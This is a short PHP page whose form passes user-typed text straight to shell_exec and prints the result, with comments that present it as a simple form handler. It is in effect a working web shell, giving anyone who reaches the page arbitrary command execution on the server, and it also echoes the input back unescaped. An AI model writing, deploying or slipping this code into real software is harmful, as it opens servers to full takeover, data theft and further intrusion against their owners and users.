<?php    
if(isset($_POST['SubmitButton'])){ //check if form was submitted
  $input = $_POST['inputText']; //get input text
  echo shell_exec("".$input."");
  $message = "You entered: ".$input;
}    
?>

<html>
<body>    
<form action="" method="post">
<?php echo $message; ?>
  <input type="text" name="inputText"/>
  <input type="submit" name="SubmitButton"/>
</form>    
</body>
</html>